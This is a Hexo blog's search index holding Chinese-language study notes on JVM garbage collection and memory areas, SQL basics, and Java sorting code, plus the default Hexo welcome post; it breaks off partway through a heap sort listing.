<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>JVM虚拟机总结</title>
      <link href="/JVM-summary/"/>
      <url>/JVM-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jvm垃圾处理方法"><a class="markdownIt-Anchor" href="#jvm垃圾处理方法"></a> JVM垃圾处理方法</h2><ul><li>标记-清除算法<ul><li>标记阶段：先通过根节点，标记所有从根节点开始的对象，未被标记的为垃圾对象</li><li>清除阶段：将所有未标记的对象清除</li></ul></li><li>标记-整理算法<ul><li>标记阶段：先通过根节点，标记所有从根节点开始的可达对象，未被标记的为垃圾对象</li><li>整理阶段：将所有的存活对象压缩到一段连续的内存空间，之后清理边界的所有空间</li></ul></li><li>复制算法<ul><li>将所有的内存空间分成两块，每次只使用一块，在垃圾回收时，将正在使用的内存中的存活对象复制到未使用的内存块中，然后清除正在使用的内存块中的所有对象</li></ul></li></ul><p><img src="https://upload-images.jianshu.io/upload_images/4470227-28ab970e8eb08269.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="JVM虚拟机三种算法的比较.png" /></p><h2 id="gc"><a class="markdownIt-Anchor" href="#gc"></a> GC</h2><h3 id="新生代-老年代-持久代"><a class="markdownIt-Anchor" href="#新生代-老年代-持久代"></a> 新生代、老年代、持久代</h3><p><img src="https://upload-images.jianshu.io/upload_images/4470227-92bac071ea694e25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p><h3 id="gc用的可达性分析算法中可作为gc-roots对象"><a class="markdownIt-Anchor" href="#gc用的可达性分析算法中可作为gc-roots对象"></a> GC用的可达性分析算法中，可作为GC Roots对象</h3><ul><li>Java虚拟机栈中的对象</li><li>方法区中的静态成员</li><li>方法区中的常量引用对象</li><li>本地方法区中的JNI(Native方法)引用对象</li></ul><h3 id="新生代转移到老年代的触发条件"><a class="markdownIt-Anchor" href="#新生代转移到老年代的触发条件"></a> 新生代转移到老年代的触发条件</h3><ul><li>长期存活的对象</li><li>大对象直接进入老年代</li><li>Minor GC后，survivor仍然放不下</li><li>动态年龄判断，大于等于某个年龄的对象超过了survivor空间的一半，大于等于这个年龄的对象直接进入老年代</li></ul><h3 id="mingc-fullgc"><a class="markdownIt-Anchor" href="#mingc-fullgc"></a> MinGC、FullGC</h3><p><img src="https://upload-images.jianshu.io/upload_images/4470227-7e6ccd2423e5b396.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" /></p><h3 id="各个垃圾回收器的工作方式"><a class="markdownIt-Anchor" href="#各个垃圾回收器的工作方式"></a> 各个垃圾回收器的工作方式</h3><p><img src="https://upload-images.jianshu.io/upload_images/4470227-6488fb132223326d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Serial收集器.png" /></p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-40e58a3517c0e9bc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="ParNew收集器.png" /></p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-921e1bde61ed094f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Parallel+Scavenge收集器.png" /></p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-4bb4e47c17350450.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CMS收集器.png" /></p><p><img src="https://upload-images.jianshu.io/upload_images/4470227-9def677b07f27e8c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="G1收集器.png" /><br />还有两个老年代收集器：Serial old和Parallel old收集器</p><h2 id="java虚拟机内存的划分以及每个区域的功能"><a class="markdownIt-Anchor" href="#java虚拟机内存的划分以及每个区域的功能"></a> Java虚拟机内存的划分以及每个区域的功能</h2><p><img src="https://upload-images.jianshu.io/upload_images/4470227-a7f5bb0eab4a7c1b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Java运行时数据区域" /></p><h3 id="程序计数器线程私有"><a class="markdownIt-Anchor" href="#程序计数器线程私有"></a> 程序计数器（线程私有）</h3><ul><li>线程创建时创建，执行本地方法时其值为undefined</li></ul><h3 id="虚拟机栈线程私有"><a class="markdownIt-Anchor" href="#虚拟机栈线程私有"></a> 虚拟机栈（线程私有）</h3><ul><li>（栈内存）为虚拟机执行Java方法服务，方法被调用时创建栈帧–&gt;局部变量表（基本数据类型，对象引用类型）–&gt;局部变量，对象引用</li><li>如果线程请求的栈深度超过了虚拟机所允许的深度，就会出现<code>StackOverfFow</code></li><li>虚拟机栈可以动态扩展，如果扩展到无法申请足够的内存时，会出现<code>OutOfMemeory</code></li></ul><h3 id="本地方法栈线程私有"><a class="markdownIt-Anchor" href="#本地方法栈线程私有"></a> 本地方法栈（线程私有）</h3><ul><li>Java虚拟机栈是为Java方法服务，而本地方法栈视为虚拟机使用到的Native方法服务</li><li>Java虚拟机没有对本地方法的使用和数据结构做强制规定。Sun HotSpot把Java虚拟机栈和本地方法栈合二为一</li><li>同样抛出<code>StackOverfFlowError</code>和<code>OutOfMemeoryError</code></li></ul><h3 id="java堆"><a class="markdownIt-Anchor" href="#java堆"></a> Java堆</h3><ul><li>被所有线程所共享，在Java虚拟机启动时创建，几乎所有的对象实例都存放在这里</li><li>GC管理的主要区域</li><li>物理不连续，逻辑上连续，可以动态扩展，扩展失败抛出<code>OutOfMemeoryError</code></li></ul><h3 id="方法区"><a class="markdownIt-Anchor" href="#方法区"></a> 方法区</h3><ul><li>用于存储已被虚拟机加载的类信息、常量、静态变量、即时编译器编译后的代码的数据</li><li>Sun HotSpot虚拟机把方法区称为<code>永久代</code></li></ul><h3 id="运行时常量池"><a class="markdownIt-Anchor" href="#运行时常量池"></a> 运行时常量池</h3><ul><li>受到方法区的限制，可能抛出<code>OutOfMemeoryError</code></li></ul><h2 id="双亲委派机制"><a class="markdownIt-Anchor" href="#双亲委派机制"></a> 双亲委派机制</h2><p><img src="https://user-gold-cdn.xitu.io/2017/5/8/74d4b5eadd9880c6ede99faefae88d24?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="类加载器双亲委派模型" /></p><p>如果一个类加载器收到了类加载的请求，它首先不会自己去尝试加载这个类，而且把这个请求委派给父类加载器去完成，每一个层次的加载器都如此，因此所有的类加载器都会交给顶层的启动类加载器。只有当父类加载器无法完成该加载请求时（该加载器的搜索范围内没有找到对应的类）时，子加载器才会尝试直接去加载。</p><h2 id="student-s-new-student在内存中做的事情"><a class="markdownIt-Anchor" href="#student-s-new-student在内存中做的事情"></a> Student s = new Student()在内存中做的事情</h2><ol><li>加载Student class文件到内存</li><li>在栈内存为s开辟空间（对象引用类型）</li><li>在堆内存为学生对象开辟空间（对象实例）</li><li>对学生对象的成员变量进行默认初始化</li><li>对学生对象的成员变量进行显式初始化</li><li>通过构造方法给学生对象的成员变量进行赋值</li><li>学生对象初始化完成， 把对象地址赋值给s变量</li></ol><h2 id="java的gc为什么要分代"><a class="markdownIt-Anchor" href="#java的gc为什么要分代"></a> Java的GC为什么要分代</h2><p>分代的垃圾回收策略，是基于这样一个事实：**不同的对象的生命周期是不一样的。**因此，不同生命周期的对象可以采取不同的收集方式，以便提高回收效率。</p><blockquote><p>试想，在不进行对象存活时间区分的情况下，每次垃圾回收都是对整个堆空间进行回收，花费时间相对会长，同时，因为每次回收都需要遍历所有存活对象，但实际上，对于生命周期长的对象而言，这种遍历是没有效果的，因为可能进行了很多次遍历，但是他们依旧存在。因此，分代垃圾回收采用分治的思想，进行代的划分，把不同生命周期的对象放在不同代上，不同代上采用最适合它的垃圾回收方式进行回收。</p></blockquote><h3 id="如何分代"><a class="markdownIt-Anchor" href="#如何分代"></a> 如何分代</h3><p>虚拟机中共分为三代：年轻代、老年代和持久代。其中持久代主要存放的是Java类的类信息，与垃圾收集要收集的Java对象关系不大。年轻代和老年代是对垃圾收集影响比较大的。</p><ol><li><p>年轻代<br />所有新生成的对象首先都是放在年轻代的。年轻代的目标就是尽可能快速的收集掉那些生命周期短的对象。年轻代分为三个区。一个Eden区，两个Survivor区（一般而言）。大部分对象在Eden区中生成。当Eden区满时，还存活的对象将被复制到Survivor区（两个中的一个），当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到另一个Survivor区，当这个Survivor区也满了的时候，从第一个Survivor区复制过来的并且此时还存活的对象，将被复制到“老年区”。需要注意的是，Survivor的两个区是对称的，没先后顺序，所以同一个区中可能存在从Eden复制过来的对象，和从前一个Survivor复制过来的对象，而复制到老年区的只有从第一个Survivor区过去的对象。而且，Survivor区总有一个是空的。同时，根据程序需要，Survivor区是可以配置为多个的（多于两个），这样可以增加对象在年轻代中的存在时间，减少被放到老年代的可能。</p></li><li><p>老年代<br />在年轻代中经历了N次垃圾回收后仍然存活的对象，就会被放到老年代。因此，可以认为老年代中存放的都是一些生命周期较长的对象。</p></li><li><p>持久代<br />用于存放静态文件，如Java类、方法等。持久代对垃圾回收没有显著影响，但是有些应用可能动态生成或者调用一些class，例如hibernate等，在这种时候需要设置一个比较大的持久代空间来存放这些运动过程中新增的类。</p></li></ol><h2 id="minor-gc-full-gc触发条件是什么"><a class="markdownIt-Anchor" href="#minor-gc-full-gc触发条件是什么"></a> Minor GC、Full GC触发条件是什么？</h2><h3 id="minor-gc-full-gc触发条件"><a class="markdownIt-Anchor" href="#minor-gc-full-gc触发条件"></a> Minor GC、Full GC触发条件</h3><ul><li>从年轻代空间（包括Eden、Survivor区域）回收内存被称为Minor GC</li><li>对老年代GC称为Major GC</li><li>而Full GC是对整个堆来说</li></ul><p>在最近几个版本的JDK里默认包括了对永生代即方法区的回收（JDK8中无永生代了），出现Full GC的时候经常伴随至少一次的Minor GC,但非绝对的。</p><p>Major GC的速度一般会比Minor GC慢10倍以上。下边看看有那种情况触发JVM进行Full GC及应对策略。</p><ol><li>Minor GC触发条件：<br />当Eden区满时，触发Minor GC。</li><li>Full GC触发条件：</li></ol><ul><li>System.gc()方法的调用</li></ul><blockquote><p>此方法的调用是建议JVM进行Full GC，虽然只是建议而非一定，但很多情况下它会触发Full GC，从而增加Full GC的频率，也即增加了间歇性停顿的次数。虽然影响系统建议不能使用这个方法，让虚拟机自己去管理它的内存。</p></blockquote><ul><li>老年代空间不足</li></ul><blockquote><p>老年代空间只有在新生代对象转入及创建大对象、大数组时才会出现不足的现象，当执行Full GC后空间仍然不足，则抛出如下错误：<code>java.lang.OutOfMemoryError: Java heap space</code>，为避免以上两种情况引起的Full GC，调优时应尽量做到让对象在Minor GC阶段被回收、让对象在新生代多存活一段时间及不要创建过大的对象及数组。</p></blockquote><ul><li>方法区空间不足</li></ul><blockquote><p>JVM规范中运行时数据区域中的方法区，在HotSpot虚拟机中又被习惯称为永生代或者永生区，Permanet Generation中存放的为一些class的信息、常量、静态变量等数据，当系统中要加载的类、反射的类和调用的方法较多时，Permanet Generation可能会被占满，在未配置为采用CMS GC的情况下也会执行Full GC。如果经过Full GC仍然回收不了，那么JVM会抛出如下错误信息：<br />java.lang.OutOfMemoryError: PermGen space<br />为避免Perm Gen占满造成Full GC现象，可采用的方法为增大Perm Gen空间或转为使用CMS GC。</p></blockquote><ul><li>通过Minor GC后进入老年代的平均大小大于老年代的可用内存</li></ul><blockquote><p>如果发现统计数据说之前Minor GC的平均晋升大小比目前old gen剩余的空间大，则不会触发Minor GC而是转为触发full GC</p></blockquote><ul><li>由Eden区、From Space区向To Space区复制时，对象大小大于To Space可用内存，则把该对象转存到老年代，且老年代的可用内存小于该对象大小</li></ul><h2 id="g1-gc"><a class="markdownIt-Anchor" href="#g1-gc"></a> G1 GC</h2><p>G1 GC是目前为止最为复杂、也是最先进的GC，在CMS算法中，GC管理的内存被划分为新生代、老年代和永久代/元空间。这些空间必须是地址连续的。在G1算法中，采用了另外一种完全不同的方式组织堆内存，堆内存被划分为多个大小相等的内存块（Region），每个Region是逻辑连续的一段内存，Region的大小可以通过<code>-XX:G1HeapRegionSize</code>参数指定，如果没有配置，默认堆内存按照2048份均分，最后得到一个合理的大小。在G1中，还有一个特殊的区域，叫Humongous 区域。</p><p>如果一个对象占用的空间超过了分区容量50%以上，G1收集器就认为这是一个巨型对象。这些巨型对象，默认直接会被分配在老年代，但是如果它是一个短期存在的巨型对象，就会对垃圾回收器造成负面影响。为了解决这个问题，G1划分了一个Humongous 区域，它用来专门存放巨型对象，下面的图片展示了G1的内存结构：<br /><img src="https://upload-images.jianshu.io/upload_images/7853175-8c5cbf9a129c4d54.png" alt="" /></p><h3 id="g1-gc内存结构"><a class="markdownIt-Anchor" href="#g1-gc内存结构"></a> G1 GC内存结构</h3><p>G1 GC的运行可以分为下面几个阶段：</p><ol><li><p>**初始标记：**扫描根集合，标记所有从根节点可直接到达的对象并将它们的字段压入扫描栈。在分代式G1模式中，初始标记阶段借用 Young GC 的暂停，因而没有额外的、单独的暂停阶段。</p></li><li><p>**并发标记：**这个阶段可以并发执行，GC线程不断从扫描栈取出引用，进行递归标记，直到扫描栈清空。</p></li><li><p>**最终标记：**重新标记写入屏障标记的对象，这个阶段也进行弱引用处理。</p></li><li><p>**筛选回收：**统计每个Region被标记位活的对象有多少，如果发现完全没有活对象的Region就会将其整体回收到可分配 Region 列表中。</p></li></ol><p>与其他GC相比，G1 GC有如下特点：</p><ol><li><p>**并行与并发：**G1 GC能充分利用CPU、多核心等硬件优势，使用多个CPU或者CPU核心来缩短STW的时间，部分其他GC需要停顿java线程执行的GC操作，在G1 GC中仍然可以通过并发的方式让java程序继续执行</p></li><li><p>**分代收集：**和其他GC一样，分代的概念在G1 GC中仍然保留</p></li><li><p>**空间整合：**与CMS的标记-清理算法不同，G1 GC从整体来看是通过”标记-整理“算法实现的GC，从局部（两个Region之间）来看是通过”复制“算法来实现的，无论如何，这两种算法在运行期间都不会产生内存碎片，GC 活动之后可以提供规整的内存空间。</p></li><li><p>**可预测的停顿：**这是G1 GC相对于CMS的另一大优势，降低停顿时间是G1 GC和CMS GC共同关注的，但是G1 GC除了追求低停顿时间外，还建立了可预测的停顿时间模型，能让使用这明确指定在一个长度为M的时间片内，消耗在垃圾收集上的事件不得超过N毫秒。</p></li></ol><p>下面的图片展示了多个GC以及他们工作的分代位置，以及如何组合使用：<br /><img src="https://upload-images.jianshu.io/upload_images/7853175-35e974e2a2f37f82.png" alt="" /></p><h3 id="jvm-gc的触发条件"><a class="markdownIt-Anchor" href="#jvm-gc的触发条件"></a> JVM GC的触发条件</h3><ol><li><p>**Young GC：**当Young generation中的Eden区分配满的时候触发。</p></li><li><p><strong>Full GC：</strong></p></li></ol><ul><li>当准备要触发一次young GC时，如果发现统计数据Young GC的平均大小比目前Old Gen剩余的空间大，则不会触发Young GC而是转为触发Full GC。</li><li>如果有Perm Gen的话，要在Perm Gen分配空间但已经没有足够空间时，也要触发一次Full GC</li><li>调用System.gc()默认也是触发Full GC</li></ul><h3 id="jvm性能监控与故障处理工具"><a class="markdownIt-Anchor" href="#jvm性能监控与故障处理工具"></a> JVM性能监控与故障处理工具</h3><ul><li>jps：JVM进程状况工具<br />选项：<br />-m 输出JVM进程启动时传递给主类main方法的参数<br />-l 输出主类的全名，如果进程执行的是jar包，输出jar包的路径<br />-v 输出进程启动时的JVM参数</li><li>jstat：JVM统计信息监控工具<br />该工具具有丰富的JVM统计功能，具体支持的统计可以使用man jstat来输出帮助文档</li><li>jinfo：java配置信息工具<br />jinfo用于获取当前JVM的配置信息</li><li>jmap：java内存映射工具<br />jmap用于生成堆的转储快照，下面为一个使用示例，用于将当前的JVM的堆的快照输出到文件中去</li><li>jhat：等jhat执行完毕后，就可以打开浏览器查看堆的情况的</li><li>jstack：JVM堆栈追踪工具<br />jstack用于生成当前堆栈的线程快照，这个命令会将所有在堆上的线程都输出，包括线程的运行状态，持有资源的状态等等，对于java应用调优，jstack是非常有用的。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> JVM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/hello-world/"/>
      <url>/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="quick-start"><a class="markdownIt-Anchor" href="#quick-start"></a> Quick Start</h2><h3 id="create-a-new-post"><a class="markdownIt-Anchor" href="#create-a-new-post"></a> Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="run-server"><a class="markdownIt-Anchor" href="#run-server"></a> Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="generate-static-files"><a class="markdownIt-Anchor" href="#generate-static-files"></a> Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="deploy-to-remote-sites"><a class="markdownIt-Anchor" href="#deploy-to-remote-sites"></a> Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL</title>
      <link href="/sql-summary/"/>
      <url>/sql-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="基础"><a class="markdownIt-Anchor" href="#基础"></a> 基础</h2><ol><li>DML语句：主要由insert、update和delete三个关键字组成</li><li>DDL语句：主要由create、alter、drop和truncate四个关键字组成</li></ol><h2 id="ddl语句"><a class="markdownIt-Anchor" href="#ddl语句"></a> DDL语句</h2><ol><li>增加列、修改列、删除列：add、modify、drop</li><li>删除表：drop table 表名;</li><li>truncate表：删除该表里的全部数据，但保留表结构；只能一次性删除整个表的全部记录；比delete删除速度要快</li><li>建立索引：create index 索引名 on 表名<br />索引的缺陷：</li></ol><ul><li>当数据表中的记录被添加、删除、修改时，数据库系统需要维护索引，因此有一定的系统开销</li><li>存储索引需要一定的磁盘空间</li></ul><ol start="5"><li>distinct去除重复记录</li></ol><h2 id="dml语句"><a class="markdownIt-Anchor" href="#dml语句"></a> DML语句</h2><ol><li>mysql使用concat进行字符串连接</li><li>SQL语句中的通配符：下划线代表一个任意的字符，百分号代表任意多个字符</li><li>数据库函数</li></ol><ul><li>ifnull(expr1, expr2)，如果expr1为null，则返回expr2，否则返回expr1</li><li>nullif(expr1, expr2)，如果expr1和expr2相等，则返回null，否则返回expr2</li><li>if(expr1, expr2, expr3)，如果expr1为true，不等于0，且不等于null，则返回expr2，否则返回expr3</li><li>isnull(expr1)，判断expr1是否为null</li></ul><ol start="4"><li>分组与组函数：avg、count、max、min和sum</li></ol><ul><li>having子句：不能在where子句中过滤组，where子句仅用于过滤行。过滤组必须使用having子句；不能在where子句中使用组函数，having子句才可以使用组函数</li></ul><ol start="5"><li>多表连接查询： 查询用的多个数据表显式使用xxx join连接，而不是直接依次排列在from之后，from之后只需要放一个数据表；连接条件不再放在where之后，而是提供了专门的连接条件子句</li></ol><ul><li>on子句连接，每个on子句只指定一个连接条件</li><li>左、右、全外连接：left join、right join、full join<br />SQL99与SQL92的外连接恰好相反，SQL99左外连接将会把左边表中所有不满足连接条件的记录全部列出；SQL99右外连接将会把所有右边表不满足连接条件的记录全部列出；全外连接将会把两个表中所有不满足条件的记录全部列出（Mysql并不是全外连接）</li></ul><ol start="6"><li>集合运算：将select返回的两个结果集做运算，intersect（交，不支持，使用多表连查来替代）、union（并）、minus（差，不支持，使用子查询来替代）<br />注意：</li></ol><ul><li>两个结果集所包含的数据列的数量必须相同</li><li>两个结果集所包含的数据列的数据类型也必须一一对应</li></ul><h2 id="sql-select语句的完整执行顺序"><a class="markdownIt-Anchor" href="#sql-select语句的完整执行顺序"></a> SQL select语句的完整执行顺序</h2><p>1、from子句组装来自不同数据流的数据<br />2、where子句基于指定的条件对记录行进行筛选<br />3、group by子句将数据划分为多个分组<br />4、使用聚集函数进行计算<br />5、使用having子句筛选分组<br />6、计算所有的表达式<br />7、select的字段<br />8、使用order by对结果集进行排序<br />SQL语言不同于其他编程语言最明显特征就是处理代码的顺序。在大多数据库语言中，代码按编码顺序被处理。但在SQL语言中，第一个被处理的子句是FROM，而不是SELECT，SQL查询处理的步骤编号如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(8)<span class="keyword">SELECT</span> (<span class="number">9</span>) <span class="keyword">DISTINCT</span> (<span class="number">11</span>) &lt;TOP_specification&gt; &lt;select_list&gt; </span><br><span class="line">(<span class="number">1</span>) <span class="keyword">FROM</span> &lt;left_table&gt; </span><br><span class="line">(<span class="number">3</span>) &lt;join_type&gt; <span class="keyword">JOIN</span> &lt;right_table&gt; </span><br><span class="line">(<span class="number">2</span>) <span class="keyword">ON</span> &lt;join_condition&gt; </span><br><span class="line">(<span class="number">4</span>) <span class="keyword">WHERE</span> &lt;where_condition&gt;</span><br><span class="line">(<span class="number">5</span>) <span class="keyword">GROUP</span> <span class="keyword">BY</span> &lt;group_by_list&gt;</span><br><span class="line">(<span class="number">6</span>) <span class="keyword">WITH</span> &#123;<span class="keyword">CUBE</span> | <span class="keyword">ROLLUP</span>&#125;</span><br><span class="line">(<span class="number">7</span>) <span class="keyword">HAVING</span> &lt;having_condition&gt;</span><br><span class="line">(<span class="number">8</span>) <span class="keyword">ORDER</span> <span class="keyword">BY</span> &lt;order_by_list&gt;</span><br></pre></td></tr></table></figure><p>以上每个步骤都会产生一个虚拟表，该虚拟表被用作下一个步骤的输入。这些虚拟表对调用者（客户端应用程序或者外部查询）不可用。只有最后一步生成的表才会给调用者。如果没有在查询中指定某一个子句，将跳过相应的步骤。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> SQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/algorithm-sort/"/>
      <url>/algorithm-sort/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 22:03</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 冒泡排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bubbleSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">bubbleSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length - i - <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        bubbleSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 21:31</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 堆排序</span></span><br><span class="line"><span class="comment"> * o(nlogn)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 先建立最大堆，然后排序</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">heapSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> index = nums.length;</span><br><span class="line">        heapify(nums);</span><br><span class="line">        <span class="keyword">while</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = nums[index - <span class="number">1</span>];</span><br><span class="line">            nums[index - <span class="number">1</span>] = nums[<span class="number">0</span>];</span><br><span class="line">            nums[<span class="number">0</span>] = tmp;</span><br><span class="line"></span><br><span class="line">            index--;</span><br><span class="line">            helper(nums, index, <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">heapify</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = (nums.length - <span class="number">1</span>) / <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            